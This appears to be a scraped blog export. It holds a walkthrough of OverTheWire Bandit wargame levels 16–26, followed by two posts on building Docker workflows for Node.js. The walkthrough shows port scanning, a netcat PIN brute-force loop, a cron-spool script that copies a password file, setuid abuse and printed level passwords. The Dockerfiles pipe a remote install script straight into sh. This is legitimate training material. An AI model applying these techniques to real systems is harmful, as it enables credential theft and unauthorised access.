","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:16:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 16 -\u003e Level 17 The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. First I scanned the port range to see which ports were open and supports SSLv3. bandit16@bandit:~$ nmap --script ssl-enum-ciphers -p 31000-32000 localhost Starting Nmap 7.01 ( https://nmap.org ) at 2017-12-26 23:36 CET Nmap scan report for localhost (127.0.0.1) Host is up (0.00015s latency). Other addresses for localhost (not scanned): ::1 Not shown: 996 closed ports PORT STATE SERVICE 31046/tcp open unknown 31518/tcp open unknown | ssl-enum-ciphers: | TLSv1.0: | ciphers: | TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A | compressors: | NULL | cipher preference: indeterminate | cipher preference error: Too few ciphers supported |_ least strength: A 31691/tcp open unknown 31790/tcp open unknown | ssl-enum-ciphers: | TLSv1.0: | ciphers: | TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A | compressors: | NULL | cipher preference: indeterminate | cipher preference error: Too few ciphers supported |_ least strength: A 31960/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds I only have 2 ports returned, so I manually tested them. bandit16@bandit:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -connect localhost:31518 -ign_eof bandit16@bandit:~$ echo cluFn7wTiGryunymYOu4RcffSxQluehd | openssl s_client -connect localhost:31790 -ign_eof The latter yieled an RSA private key which I saved to a file and used to ssh into level 17. bandit16@bandit:/tmp$ mkdir /tmp/bandit17 bandit16@bandit:/tmp$ cd /tmp/bandit17 bandit16@bandit:/tmp$ vim id_rsa bandit16@bandit:/tmp$ chmod 600 id_rsa bandit16@bandit:/tmp$ ssh -i id_rsa bandit17@localhost ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:17:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 17 -\u003e Level 18 There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.new bandit17@bandit:~$ diff passwords.new passwords.old 42c42 \u003c kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd --- \u003e 7cDk1R96wgw11eEuTk1zgbjAindhpUA5 ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:18:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 18 -\u003e Level 19 The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH. → ssh bandit.labs.overthewire.org -p 2220 -l bandit18 -t \"bash --noprofile --norc\" This is a OverTheWire game server. More information on http://www.overthewire.org/wargames bandit18@bandit.labs.overthewire.org's password: bash-4.3$ cat readme IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:19:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 19 -\u003e Level 20 To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary. bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:20:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 20 -\u003e Level 21 There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Changes to the infrastructure made this level more difficult. You will need to figure out a way to launch multiple commands in the same Docker instance. NOTE 2: Try connecting to your own network daemon to see if it works as you think Due to the infrastructure changes mentioned in note 1, launching a new shell will connect to a newly spawned Docker container. To avoid this, I have two sessions opened in tmux in the same shell. The first shell will listen in on a random port I choose (34100), and the second shell will run the suconnect binary. Session 1: bandit20@bandit:~$ nc -l 31400 GbKksEFF4yrVs6il55v6gwY5aVje5f0j gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Session 2: bandit20@bandit:~$ ./suconnect 31400 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j Password matches, sending next password ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:21:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 21 -\u003e Level 22 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. bandit21@bandit:~$ ls -al /etc/cron.d total 28 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 101 root root 4096 Dec 16 14:19 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rw-r--r-- 1 root root 120 Nov 13 15:58 cronjob_bandit22 -rw-r--r-- 1 root root 122 Nov 13 15:58 cronjob_bandit23 -rw-r--r-- 1 root root 120 Nov 13 15:58 cronjob_bandit24 -rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contest bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026\u003e /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh ##!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u003e /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:22:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 22 -\u003e Level 23 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints. bandit22@bandit:~$ ls -al /etc/cron.d total 28 drwxr-xr-x 2 root root 4096 Nov 13 15:58 . drwxr-xr-x 101 root root 4096 Dec 16 14:19 .. -rw-r--r-- 1 root root 102 Apr 5 2016 .placeholder -rw-r--r-- 1 root root 120 Nov 13 15:58 cronjob_bandit22 -rw-r--r-- 1 root root 122 Nov 13 15:58 cronjob_bandit23 -rw-r--r-- 1 root root 120 Nov 13 15:58 cronjob_bandit24 -rw-r--r-- 1 root root 190 Oct 31 13:21 popularity-contest bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026\u003e /dev/null bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh ##!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1) echo \"Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\" cat /etc/bandit_pass/$myname \u003e /tmp/$mytarget bandit22@bandit:~$ whoami bandit22 bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1 8ca319486bfbbc3663ea0fbe81326349 bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:23:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 23 -\u003e Level 24 A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around. bandit23@bandit:/var/spool/bandit24$ cat /usr/bin/cronjob_bandit24.sh ##!/bin/bash myname=$(whoami) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; then echo \"Handling $i\" timeout -s 9 60 ./$i rm -f ./$i fi done A previous level mentioned that passwords are stored in this file: /etc/bandit_pass/bandit24. Since the script will be executed before it is deleted, the following bash script will export the contents of the file to something accessable to my current bandit23 user. Note that the script has to have execute permissions to run. bandit23@bandit:~$ cd /var/spool/bandit24 bandit23@bandit:/var/spool/bandit24$ vim script.sh bandit23@bandit:/var/spool/bandit24$ chmod 777 script.sh ##!/bin/bash mkdir /tmp/bandit24tmp cat /etc/bandit_pass/bandit24 \u003e /tmp/bandit24tmp/password.txt bandit23@bandit:/var/spool/bandit24$ cat /tmp/bandit24tmp/password.txt UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:24:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 24 -\u003e Level 25 A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. I first checked to see the output of sending the password and pin to port 30002 via netcat. bandit24@bandit:~$ echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000 | nc localhost 30002 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. Wrong! Please enter the correct pincode. Try again. Exiting. After inspecting the output, I wrote a quick script to brute force all 10000 combinations and outputted to a file. bandit24@bandit:~$ mkdir /tmp/bandit24tmp for i in $(seq -f \"%04g\" 0 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i | nc localhost 30002; done \u003e /tmp/bandit24tmp/output.txt Then we grab the only unique output. bandit24@bandit:~$ sort /tmp/bandit24tmp/output.txt | uniq -u Correct! The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:25:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 25 -\u003e Level 26 Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. This one took me a while to figure out. The SSH key to log in is clearly located in the home directory, however SSH’ing into bandit26@localhost causes the connection to close. I first looked at what shell the user was using: bandit25@bandit:~$ getent passwd bandit26 | cut -d: -f7 /usr/bin/showtext``` Upon further inspection, /usr/bin/showtext is a shell script: bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux more ~/text.txt exit 0 I’m not going to give this one away, but the trick to solving this one is exploiting the properties of how more displays text to access one of the files the user has read access to and retrieving the password from there. ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:26:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Level 26 -\u003e Level 27 At this moment, level 27 does not exist yet. ","date":"12-26-2017","objectID":"/posts/overthewire-bandit/:27:0","tags":null,"title":"OverTheWire Bandit","uri":"/posts/overthewire-bandit/"},{"categories":null,"content":"Note: These are my findings after working with Docker, Jenkins, and AWS for only 2-3 months. This post details my thought process for the workflow I have set up with Docker and was written to document my progress. However, it might be useful for other beginners who are interested in setting up a better workflow for development with Node.js and Docker. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:0:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"The Problem Our development team occasionally has to switch between different projects. Each project has its own set of dependencies requiring a specific version of Node.js, npm, and/or Ruby to be run. Using nvm and rvm can mitigate the issue, but constantly switching between versions is a hassle and it is easy to lose track of which version you’re currently using. Time is also wasted on debugging environment inconsistencies between local development machines, and even more time is lost solving cross-platform issues when deploying to the dev/qa/prod servers (OSX to Linux). Many hours were lost for both the development and system administration teams debugging these issues; hours that could instead be spent improving the current project or working on other projects. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:1:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Proposed Solution We needed a standardized environment, reproducible across our developer’s machines, Jenkins servers, and production servers. The two most popular technologies that solve this problem are Vagrant and Docker. Vagrant and Docker also helps us onboard new developers much more quickly. Before we started using Docker, new developers would have to follow a lengthy readme, download every necessary dependency, and configure their installations. Despite following the readme exactly, there may be some issues due to setups from previous projects and additional time is spent troubleshooting. With Vagrant and Docker, the environment is already preconfigured and isolated, allowing a new developer to get started with much less hassle. I chose to use Docker for our workflow primarily because of how lightweight it is. Running an entire virtual machine uses more system resources than running containers. Also, our front end projects all require Node.js, npm, and compass. Creating an image and using it as a base for all projects makes more sense than using Vagrant to run a completely isolated virtual machine for each one. Switching between projects is much faster and having a virtual machine for each project when they have very similar environments seems redundant. Furthermore, our Jenkins servers are running on small AWS EC2 instances. The overhead of multiple virtual machines on a machine is much more than having containers spun up from Docker images created from the same base image. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:2:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Setting up Docker Since our company is in the beginning stages of embracing the DevOps philosophy, I’ve made the decision to keep our setup simple for now. As we feel more comfortable with using Docker, I’ll be setting up private repos on Docker Hub, Quay, or AWS ECR. At the moment, I have an image on a public repo serving as the project base. This image contains everything the application needs to run and compile assets with gulp and compass. Base Dockerfile: FROM debian:8.3 MAINTAINER Brian Choy \u003cbchoy@barbariangroup.com\u003e ENV NODE_VERSION=4.3.1 \\ NPM_VERSION=3.7.3 RUN ln -snf /bin/bash /bin/sh; \\ apt-get update \u0026\u0026 apt-get install -y --no-install-recommends \\ curl \\ git \\ ca-certificates \\ libpng12-dev \\ pngquant \\ ruby-compass; \\ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh; \\ cp -f ~/.nvm/nvm.sh ~/.nvm/nvm-tmp.sh; \\ echo \"nvm install ${NODE_VERSION}; nvm alias default ${NODE_VERSION}; ln -s ~/.nvm/versions/node/v${NODE_VERSION}/bin/node /usr/bin/node; ln -s ~/.nvm/versions/node/v${NODE_VERSION}/bin/npm /usr/bin/npm\" \u003e\u003e ~/.nvm/nvm-tmp.sh; \\ sh ~/.nvm/nvm-tmp.sh; \\ rm ~/.nvm/nvm-tmp.sh; \\ npm config set registry https://registry.npmjs.org/; \\ npm install -g npm@${NPM_VERSION}; \\ npm set progress=false CMD [\"/bin/bash\"] I am using the Debian 8.3 base image because it’s small enough, comes with a necessary packages out of the box, and has the correct version of ruby-compass that I need. The scope of our current work allows me to get away with the extra bloat. We also have just started using Docker. Optimizing and tweaking the base Docker image can be done later in case we run into issues and decide to favour Vagrant or another technology. Having additional bloat is well worth the time I would have spent building our project base image from a smaller base and finding out exactly what dependencies are needed. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:3:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Bootstrapping and Dealing with Node Modules I have written an init.sh script to quickly create the containers needed and install the Node modules. #!/bin/bash echo \"Creating node_modules container...\" docker create -v /tmp/app --name node-modules thebarbariangroup/node-compass /bin/true echo \"Installing node_modules to container...\" docker run --rm --volumes-from node-modules -v $PWD/package.json:/tmp/app/package.json:ro thebarbariangroup/node-compass /bin/bash -c \"cd /tmp/app; npm install\" echo \"Done!\" The script creates a node-modules container specifically containing the node_modules folder. Node modules will be installed to /tmp/app and will be mounted onto the gulp container. A few months ago when I first started working with Docker, I’ve seen many tutorials suggest installing Node modules with the Dockerfile. COPY package.json package.json RUN npm install COPY . . CMD [\"gulp\"] The idea behind the above approach is to cache the Node modules by only installing them when package.json is changed. This makes sense, however if I want to add or remove modules, every single module will have to be reinstalled. Waiting a few minutes whenever a package needs to be installed disrupts the workflow for every developer and a lot of time is lost. By setting up a separate container, I avoid the need to cache Node modules. package.json is copied to /tmp/app as read-only and $ npm install is run with the new package.json on that container. The only change in workflow is remembering to run the init script instead of $ npm install. I was unable to overwrite its default function and use my script. More info on the solution I used can be found reading this GitHub issue. In addition to this, npm’s progress bar was adding an incredible amount of build time. This issue can be viewed here and is resolved by turning the progress bar off: $ npm set progress=false. The slowdown has been addressed and fixed in npm v3.7.0. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:3:1","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Tackling File Watching Gulp’s watch task is essential to our workflow. Unfortunately, due to a limitation in VirtualBox, inotify-based file watchers do not work. Polling can be enabled, but it is slow and we’re used to seeing our changes almost instantly. The best solution I’ve found for this is using rsync to send files to Docker-Machine. The docker-osx-dev project packages the rsync setup in a nice, easy to use script easily installable with brew. Once installed, any developer working on the project will have to run the docker-osx-dev script and file watching will be enabled. One nice feature is directories and files listed in the .dockerignore file are automatically not included. I was facing issues with my changes not being seen on the Docker container. Simply adding the generated static assets to the .dockerignore file fixed my problems. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:3:2","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"The Problem with docker-osx-dev docker-osx-dev is great when all your developers are on OSX. Very recently one of our projects required us to support development on Windows, and the docker-osx-dev script was no longer a valid solution. This is where Vagrant came into play for me. I used Vagrant to provision the environment and set up shared folders using rsync for both Windows and OSX (Linux untested). Unfortunately, setup for Windows still has additional steps because rsync is not installed by default. Cygwin, MinGW or cwRsync has to be installed and the latest Vagrant (1.8.1) has a bug where paths are not read correctly. Using the following solutions from these two GitHub issues fixed my rsync issues and allowed me to work on my Windows environment using cwRsync. https://github.com/mitchellh/vagrant/issues/6702#issuecomment-166503021 https://github.com/mitchellh/vagrant/issues/3230#issuecomment-37757086 ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:3:3","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Running the Project Since I’m using an already compiled image, my actual Dockerfile in this project is very short. FROM thebarbariangroup/node-compass MAINTAINER Brian Choy \u003cbchoy@barbariangroup.com\u003e WORKDIR /src/app RUN ln -s /tmp/app/node_modules node_modules COPY . . EXPOSE 3000 CMD [\"npm\", \"run\", \"dockerdev\"] This will symlink the Node modules in the node-modules container (which is mounted as a volume) and allow the application to use the modules from that container. To run gulp, I’ve modified $ npm start to run this shell script: #!/bin/bash docker kill node docker rm node docker rmi $(docker images -f \"dangling=true\" -q) docker build -t thebarbariangroup/projectname . docker run -it \\ --name node \\ --volumes-from node-modules \\ -v $(pwd)/app:/src/app/app \\ -p 3000:3000 \\ thebarbariangroup/projectname Note: The names I’m using for my containers (node-modules and node) are placeholders. More specific names should be used to avoid confusion with multiple projects. When the project is built, the previous lingering container will be killed if running, and removed. Dangling images (blank image names) are also removed to keep your image list clean and free up disk space. Docker by default does not have a cleanup feature. The new node image will now build and a container will be run in interactive mode, allowing you to see gulp’s output. The node-modules container is mounted as a volume, and my app folder (where my html, js, sass is contained) is mounted onto the new node container, enabling me to view my changes while developing. Port 3000 on the host is mapped to port 3000 on the container and $ npm dockerdev (a custom npm script to run gulp) is run. For some reason I’m unable to run gulp directly due to a gulp not found error, despite it being installed. I’m unsure as to why this happens. Your project is now visible on your Docker-Machine’s IP on port 3000. To see your Docker-Machine IP, run $ docker-machine [vm name] ip. In my hosts file, I pointed projectname to my Docker-Machine IP so I can visit http://projectname:3000 to view my app. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:3:4","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Using Jenkins Jenkins is the final step in our workflow. After a change is pushed to GitHub, Jenkins will build the container using the $ gulp build:production command and the static assets will be built in the container. To retrieve these assets, the files need to be copied from the container over to a directory on the Jenkin server’s filesystem. $ docker cp projectname:/file/path/within/container /host/path/target Jenkins will then take those compiled assets and upload them to an EC2 instance running Apache. Apache will then serve the newly compiled assets. Note: I set up Docker manually in Jenkins when I started this project, but I’m looking forward to trying out the Docker Build Step plugin on my next project. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:4:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"Future Changes Revising the base image and updating all projects is easy. The Dockerfile for my base image shown earlier installs a specific Node.js and npm version. In hindsight, I realized that those versions should be specified in each project’s individual Dockerfile instead of in the base. That way each project can start out with an installation of nvm, but install its own version. I did not notice my error until after I introduced the Docker workflow to all of the developers. Fortunately, updating the base image was not a problem. This is how I handled my mistake. After removing the Node.js and npm installations from the Dockerfile for my base Docker image, I pushed the image up with the 1.0.0 tag. I reference this version number in my project’s Dockerfile: FROM thebarbariangroup/node-compass:1.0.0 MAINTAINER Brian Choy \u003cbchoy@barbariangroup.com\u003e Going forward, I will be tagging my base builds with a version number. Versioning the base image allows for more versatile updates. Now all developers will get the latest changes with a git pull because the Dockerfile is checked into the GitHub repo. Docker will handle the pulling of the latest image. Furthermore, different projects can reference different versions of the base image. If I chose to update my base image with more packages, future projects can point to thebarbariangroup/node-compass:2.0.0 while older projects that do not need those packages can still reference 1.0.0. ","date":"02-28-2016","objectID":"/posts/creating-a-docker-workflow-with-nodejs/:5:0","tags":null,"title":"Creating a Docker Workflow with Node.js","uri":"/posts/creating-a-docker-workflow-with-nodejs/"},{"categories":null,"content":"I’ve been hearing good things about Docker ever since I started working professionally as a web developer. However, a lot of the deployment process was abstracted from me. The projects I worked on were mature and had an established workflow. The code I pushed up to Github will end up magically working on the staging server and then to production. A few weeks ago I was given the opportunity see a new project grow through its infancy. I saw a lot of problems with getting a project working locally to work on production. Something would break every few pushes and time would be wasted getting the devleopers and system administrators together to figure out a solution. After hearing so many good things about Docker and how it aims to solve the problems we were having in production, I suggested that we use Docker to develop our application and ship it to production. Knowing absolutely nothing about Docker, these are the problems I faced and the references I used to figure out a workflow for our developers. This is yet another blog post where I jot down my thoughts and decision making, and not really walking through anything. ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:0:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Why Use Docker? We all develop on OSX here at my company. The current project I’m working on is a Node.js + React application that works perfectly fine on OSX, but encounters some issues with node_modules on production. Our Jenkins build will result in failure due to some unforeseen issue costing us time to troubleshoot and fix. Ideally we would work in an environment that mirrors production as close as possible to avoid these issues. Docker comes close to that ideal. Theoretically if our application works in a Docker container on our machines, it will also work the same in production. ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:1:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Should I Use Vagrant? Vagrant supports Docker out of the box. During the beginning stages of my research, the blogs I were reading recommended using Docker with Vagrant. After setting up Docker with Vagrant, I decided that this was unnecessary for my current project. For a one container ecosystem in an all OSX dev environment, Vagrant adds additional complexity for no real gain. There was no real need to mimic the same exact environment across everyone’s machines - our Dockerfile sufficed for this project. However, I ran into the problem of syncing files to actively develop using a running container. When an image is created, it is created with the current files and is not updated on further change. We want to sync our files to develop without rebuilding the container over and over. Vagrant helps solve this problem, but I found docker-osx-dev to be the best choice for this project. More reading on syncing local folders to a Docker container: http://oliverguenther.de/2015/05/docker-host-volume-synchronization/ https://hharnisc.github.io/2015/09/16/developing-inside-docker-containers-with-osx.html More reading on Docker vs Vagrant: https://stackoverflow.com/questions/16647069/should-i-use-vagrant-or-docker-for-creating-an-isolated-environment http://www.ociweb.com/resources/publications/sett/march-2015-docker-vs-vagrant/ https://www.mikelangelo-project.eu/2015/10/5-steps-to-boost-your-productivity-with-vagrant-and-docker/ http://activelamp.com/blog/devops/docker-with-vagrant/ http://blog.scottlowe.org/2015/02/10/using-docker-with-vagrant/ ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:2:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"How to Start Dockerizing? How do I even start dockerizing this? It was a daunting task, but I was able to break it down over time and understand what I was doing. The first step was to install Docker via docker-machine. Docker runs natively on Linux - to run Docker on OSX, you will need Virtualbox to run the docker-machine VM. If you run into blog posts talking about boot2docker, it has been replaced with docker-machine. boot2docker was a Linux distribution made specifically to run Docker containers. I’m assuming docker-machine to be something similar. Each shell you open, you will have to define which docker-machine VM you’re using, else you’ll run into the Can't connect to docker daemon. Is 'docker -d' running on this host? error. To avoid having to type eval \"$(docker-machine env default)\" over and over again in each shell I open, I just added it to my .bash_profile. This gives me access to all my docker commands. Some quick things you can type to get started: docker ps: Lists all your running containers docker ps -a: Lists all containers that exist on your system docker images: Lists all your images ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:3:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Creating a Dockerfile This is my Dockerfile for my Node.js project. FROM ubuntu:14.04 MAINTAINER Brian Choy \u003cbchoy@barbariangroup.com\u003e # Install needed packages RUN apt-get update \u0026\u0026 apt-get install -y \\ curl \\ build-essential \\ python \\ zip; # Install nvm RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | sh; # Install node RUN cp -f ~/.nvm/nvm.sh ~/.nvm/nvm-tmp.sh; \\ echo \"nvm install 4.2.3; nvm alias default 4.2.3; ln -s ~/.nvm/versions/node/v4.2.3/bin/node /usr/bin/node; ln -s ~/.nvm/versions/node/v4.2.3/bin/npm /usr/bin/npm\" \u003e\u003e ~/.nvm/nvm-tmp.sh; \\ sh ~/.nvm/nvm-tmp.sh; \\ rm ~/.nvm/nvm-tmp.sh; # Install npm 3.5.1 RUN npm install npm@3.5.1 -g # Install dependencies with symlink to make work with volume mount RUN mkdir /app-dist \u0026\u0026 mkdir /app-dist/node_modules ADD package.json /app-dist/package.json RUN cd /app-dist \u0026\u0026 npm install RUN npm rebuild node-sass WORKDIR /src/app ADD . . EXPOSE 3010 CMD [\"npm\", \"run\", \"dockerdev\"] Breakdown of an example Dockerfile: https://nodesource.com/blog/dockerizing-your-nodejs-applications/ This Dockerfile tells Docker how to build out an image. With the Dockerfile, all images I create can be distributed and run locally or in production and be exactly the same. The comments I have in the Dockerfile pretty much explain what I’m doing. The order of my tasks also matter due to the Docker build cache. In a nutshell, each command is cached so that step does not have to be rebuilt unless changed. This significantly speeds up building an image by not recompiling things that are not changed. However this is not perfect and sometimes you will have to rebuild an image using the –no-cache flag. ADD . . is at the end because the directory we dev in has constantly changing files. ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:4:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Dockerignore .dockerignore: log tmp .elasticbeanstalk/* .git .gitignore node_modules/* Just like .gitignore, I have files that I don’t want compiled in my image. This file contains my AWS configs, node_modules, and my entire git history. Reducing bloat is always good - especially since the bandwidth used to pull images really adds up (more on Docker registries another time). ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:5:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Building the Container I built the container using the following command: docker build -t page-creator . This builds an image with the name page-creator while ignoring everything in the .dockerignore file. You can check the images you have on your system using docker images. Each build with the same name renames the older build to a blank name. Older Docker images eats up your hard drive space over time. You can clear out all your blank names with docker rmi $(docker images | grep \\\"^\u003cnone\u003e\\\" | awk \\\"{print $3}\\\"). To abstract running these commands and bloating up the hard drive with old images, I changed my npm start task to run the following Docker commands: \"start\": \"docker kill node; docker rm node; docker rmi $(docker images | grep \\\"^\u003cnone\u003e\\\" | awk \\\"{print $3}\\\"); docker build -t page-builder .; docker run -it --name node -p 3000:3000 -p 3001:3001 -v $(pwd):/src/app --env-file=.env page-builder\" npm run dev. I kill my container first because you cannot have two containers running with the same name. After that I remove it from my list of containers (that you can see with docker ps -a) and proceed to build a new image. Next I run the container with this command docker run -d --name node -p 3000:3000 -p 3001:3001 -v $(pwd):/src/app --env-file=.env page-builder npm run dockerdev This runs the app in detached mode (-d) and the container is named node. -p routes my local 3000 port to the docker-machine’s port 3000 and local 3000 to docker-machine 3000. -v mounts my present working directory onto the folder where my app is in the container. That way my files are synced in development. My env file is called .env and page-builder is the image I’m running. npm run dev is a custom command I made and it is the command my docker container will use to run. If no command is specified, the command specified in my Dockerfile will be run. ","date":"12-28-2015","objectID":"/posts/dockerizing-a-node-application/:6:0","tags":null,"title":"Dockerizing a Node Application","uri":"/posts/dockerizing-a-node-application/"},{"categories":null,"content":"Troubleshooting Errors I could have saved so much time if I knew how to properly debug my containers early on. Since this was a single container ecosystem, debugging was quite simple to me. To ssh into a container that is running, I run docker exec -it node bash. 